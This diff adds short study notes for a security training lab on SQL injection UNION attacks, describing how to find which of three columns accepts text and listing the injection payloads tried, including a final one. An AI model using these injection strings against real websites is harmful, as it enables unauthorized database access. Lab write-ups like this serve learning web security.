@@ -1,0 +1,22 @@
+Lab #4 SQL injection UNION attack, finding a column containing text
+# PRACTITIONER
+
+# FIND WHCH COLUMNS IS OF TYPE TEXT
+# FINAL PAYLOAD = 'UNION select NULL, 'c9c89F', NULL--
+
+Step #1 Determind number of column => done in lab 3
+
+Step #2 Determind the data types of columns => THIS LAB
+
+We know from step 1 that we have 3 column.
+select a, b, c from table1 UNION select 'a', NULL, NULL
+if error => column is not type text
+no error => column is of type text
+
+try ' UNION select 'a', NULL, NULL--
+=> error
+try ' UNION select NULL, 'a', NULL--
+=> OK
+
+
+
